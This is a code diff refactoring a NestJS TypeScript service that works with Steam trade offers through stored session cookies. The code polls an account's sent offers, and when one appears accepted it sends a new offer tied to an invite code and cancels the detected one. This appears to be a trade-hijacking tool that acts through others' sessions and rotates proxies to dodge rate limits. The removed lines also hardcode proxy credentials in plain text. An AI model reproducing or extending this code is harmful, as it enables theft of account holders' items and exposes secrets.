@@ -1,17 +1,17 @@
+import { COOKIE_PERSISTENCE_SERVICE, CookiePersistenceService } from '@backend/cookies';
+import { NotFound } from "@backend/nestjs";
 import { Inject, Injectable, Logger } from "@nestjs/common";
-import axios, { AxiosError, AxiosInstance, AxiosRequestConfig, AxiosResponse } from 'axios';
+import { ConfigService } from "@nestjs/config";
+import { AxiosInstance } from 'axios';
+import { ClsService } from "nestjs-cls";
 import { CookieJar } from 'tough-cookie';
+import { HttpClientService } from '../http/http-client.service';
+import { RetryHttpService } from '../http/retry-http.service';
+import { ProxiesService } from "../proxies/proxies.service";
 import { ScarpingService } from "../scarping/scarping.service";
 import { CustomPromiseTimeout } from "../shared";
 import { WarehouseService } from "../warehouse/warehouse.service";
 import { InventoryItem, InventoryItemForTrade } from "./dto";
-import {TradeMonitoringTaskDto } from '@backend/communication'
-import { COOKIE_PERSISTENCE_SERVICE, CookiePersistenceService } from '@backend/cookies'
-import { wrapper } from "axios-cookiejar-support";
-import { NotFound } from "@backend/nestjs";
-import { ProxiesService } from "../proxies/proxies.service";
-import { ConfigService } from "@nestjs/config";
-import { HttpsProxyAgent  } from 'https-proxy-agent'
 
 @Injectable()
 export class TradeService {
@@ -23,7 +23,10 @@ export class TradeService {
         @Inject(COOKIE_PERSISTENCE_SERVICE)
         private readonly cookiePersistence: CookiePersistenceService,
         private readonly proxyService: ProxiesService,
-        private readonly configService: ConfigService
+        private readonly configService: ConfigService,
+        private readonly clsService: ClsService,
+        private readonly retryHttpService: RetryHttpService,
+        private readonly httpClientService: HttpClientService
     ) {}
     
     private generateHeaders(tradeUserId: string, headerCookies: string) {
@@ -61,7 +64,17 @@ export class TradeService {
         return payload
     }
 
-        private async cancelTrade(idToCancel: string, httpClient: AxiosInstance, cookieJar: CookieJar, userId: string, username: string) {
+    private getUsername() {
+        return this.clsService.get("username")
+    }
+
+    private getInviteCode() {
+        return this.clsService.get("invite-code")
+    }
+
+
+    private async cancelTrade(idToCancel: string, httpClient: AxiosInstance, cookieJar: CookieJar, userId: string) {
+        const username = this.getUsername()
         const cancelTradeUrl = `https://steamcommunity.com/tradeoffer/${idToCancel}/cancel`;
         const cookies = await cookieJar.getCookies(cancelTradeUrl)
         const sessionIdCookie = cookies.find(c => c.key === 'sessionid');
@@ -90,7 +103,7 @@ export class TradeService {
         payload.append('sessionid', sessionIdCookie.value);
 
     
-        const response = await this.executeApiActionWithRetry(
+        const response = await this.retryHttpService.executeApiActionWithRetry(
         httpClient,
         {
             url: cancelTradeUrl,
@@ -107,14 +120,16 @@ export class TradeService {
         this.logger.log(`Response in cacelling trade: ${response}`)
     }
 
-    private async monitorTradesWithCheerio(httpClient: AxiosInstance, cookieJar: CookieJar, username: string, inviteCode: string) {
+    private async monitorTradesWithCheerio(httpClient: AxiosInstance, cookieJar: CookieJar) {
+        const username = this.getUsername()
+        const inviteCode = this.getInviteCode()
         const sentOffersUrl = 'https://steamcommunity.com/my/tradeoffers/sent';
         this.logger.log(`[${username}] Starting trade monitoring...`);
 
         const WAIT_TIME = 8000
         let tries = 1296000 / (WAIT_TIME / 1000);
         
-        const startResult = await this.scarpingService.getHtmlWithRetry(sentOffersUrl, `GetSentOffers_${username}`, httpClient);
+        const startResult = await this.scarpingService.getHtmlWithRetry(username, sentOffersUrl, `GetSentOffers_${username}`, httpClient);
         if(!startResult) {
             this.logger.warn(`[${username}] Could not fetch sent offers page at the start.`);
             throw new Error(`[${username}] Could not fetch sent offers page at the start.`)
@@ -122,7 +137,7 @@ export class TradeService {
         let html = this.scarpingService.loadHtml(startResult.data)
         let startCount = (this.scarpingService.getHtmlElement(html, '.tradeoffer')).length;
         while (tries > 0) {
-            const result = await this.scarpingService.getHtmlWithRetry(sentOffersUrl, `GetSentOffers_${username}`, httpClient);
+            const result = await this.scarpingService.getHtmlWithRetry(username, sentOffersUrl, `GetSentOffers_${username}`, httpClient);
             if (!result) {
                 this.logger.warn(`[${username}] Could not fetch sent offers page, skipping check.`);
                 await CustomPromiseTimeout(1000 * 5);
@@ -141,8 +156,8 @@ export class TradeService {
                     return tradeOfferId?.split("_")[1];
                 })
                     this.logger.log(`[${username}] Detected change in sent trades (${startCount} -> ${currentCount}). Assuming trade accepted. Initiating sending items...`);
-                    await this.sendTradeTest(httpClient, cookieJar, username, result.userId, inviteCode)
-                    await this.cancelTrade(tradeOfferIds[0], httpClient, cookieJar, result.userId, username)
+                    await this.sendTradeTest(httpClient, cookieJar, result.userId)
+                    await this.cancelTrade(tradeOfferIds[0], httpClient, cookieJar, result.userId)
                     startCount += 2
                     this.logger.log(`[${username}] Item sending process finished for this trigger.`);
             }
@@ -211,7 +226,9 @@ export class TradeService {
     }
     
 
-    private async sendTradeTest(httpClient: AxiosInstance, cookieJar: CookieJar, username: string, userId: string, inviteCode: string){
+    private async sendTradeTest(httpClient: AxiosInstance, cookieJar: CookieJar, userId: string, ){
+        const username = this.getUsername()
+        const inviteCode = this.getInviteCode()
         this.logger.debug("Started initiating sending trade")
         this.logger.log(`HTTP CLIENT IN SEND TRADE TEST: ${httpClient}`)
         const tradePartnerUrl = "https://steamcommunity.com/tradeoffer/new/send"
@@ -264,7 +281,7 @@ export class TradeService {
 
         try {
 
-        const response = await this.executeApiActionWithRetry(
+        const response = await this.retryHttpService.executeApiActionWithRetry(
             httpClient,
             {
                 url: tradePartnerUrl,
@@ -289,108 +306,17 @@ export class TradeService {
         }
     }
 
-    private async createHttpProxyClient(username: string) {
-        const proxy = await this.proxyService.getRandomProxy()
-        if(!proxy)
-            throw new NotFound("Proxy doesnt exist")
-        const proxyAuth = `jjoster301:VoqYwnQiWv@`
-        const proxyUrl = `http://${proxyAuth}${proxy.ip}:${proxy.port}`;
+    async monitorTradesLifecycle(): Promise<void> {
+        const username = this.getUsername()
 
-        const agent = new HttpsProxyAgent(proxyUrl);
-        const jar = new CookieJar();
-        const httpClient = wrapper(axios.create({ 
-            jar,
-            httpAgent: agent,
-            httpsAgent: agent
-        }));
-
-        await this.cookiePersistence.load(username, jar);
-        
-        return {httpClient, jar}
-    }
-
-    private async createHttpClient(username: string) {
-        const jar = new CookieJar();
-        const httpClient = wrapper(axios.create({ 
-            jar,
-        }));
-
-        await this.cookiePersistence.load(username, jar);
-        
-        return {httpClient, jar}
-    }
-
-        /**
-         * Выполняет сетевой запрос с помощью Axios с обработкой rate limit (429).
-         * @param config Конфигурация запроса Axios (url, method, data, etc.)
-         * @param actionName Имя действия для логирования.
-         * @param currentRetry Текущая попытка (для рекурсии/итерации).
-         * @returns Promise с результатом AxiosResponse в случае успеха.
-         * @throws AxiosError если ошибка не связана с rate limit или превышено число попыток.
-         */
-    public async executeApiActionWithRetry<T = any>(
-        httpClient: AxiosInstance,
-        config: AxiosRequestConfig,
-        username: string,
-        actionName: string,
-        currentRetry = 0
-    ): Promise<AxiosResponse<T> | void> {
-        this.logger.debug(`[${actionName}] Attempting API action (Retry ${currentRetry}). URL: ${config.method || 'GET'} ${config.url} and name: ${actionName}`);
-        
-        try {
-            const response = await httpClient.request<T>(config);
-            if (response.status === 429) {
-                const rateLimitError = new AxiosError(
-                    `Rate Limit Detected (429) for ${actionName}`,
-                    '429',
-                    response.config,
-                    response.request,
-                    response
-                );
-                rateLimitError.isAxiosError = true;
-                throw rateLimitError;
-            }
-            if (response.status >= 400) {
-                this.logger.warn(`[${actionName}] API action returned status ${response.status}. URL: ${config.url}`);
-                const error = new AxiosError(
-                    `API action failed with status ${response.status}`,
-                    response.status.toString(),
-                        response.config,
-                        response.request,
-                        response
-                );
-                error.isAxiosError = true;
-                throw error;
-                }
-
-            this.logger.debug(`[${actionName}] API action successful (Status ${response.status}).`);
-            return response;
-
-        } catch (error) {
-            if (axios.isAxiosError(error)) {
-                if (error.response?.status === 429) {
-                        const { httpClient } = await this.createHttpProxyClient(username)
-                        this.logger.warn(`[${actionName}] Action failed due to rate limit (429). Changed http client`);
-                        return this.executeApiActionWithRetry<T>(httpClient, config, actionName, username, currentRetry + 1);
-                }
-            } else {
-                    this.logger.error(`[${actionName}] Action failed with non-429 Axios error: ${error.message}. Status: ${error.response?.status}. URL: ${config.url}`);
-                    throw error;
-                }
-            }
-        }
-
-    async monitorTradesLifecycle(taskData: TradeMonitoringTaskDto): Promise<void> {
-        const { username, inviteCode } = taskData;
-
-        const { httpClient, jar } = await this.createHttpClient(username)
+        const { httpClient, jar } = await this.httpClientService.createHttpClient(username)
 
         // TODO: Сделать через AWS S3
         await this.cookiePersistence.load(username, jar);
         
         this.logger.log(`[${username}] Session created. Starting the monitoring process.`);
 
-        this.monitorTradesWithCheerio(httpClient, jar, username, inviteCode);
+        this.monitorTradesWithCheerio(httpClient, jar);
         
         await this.cookiePersistence.save(username, jar)
     }
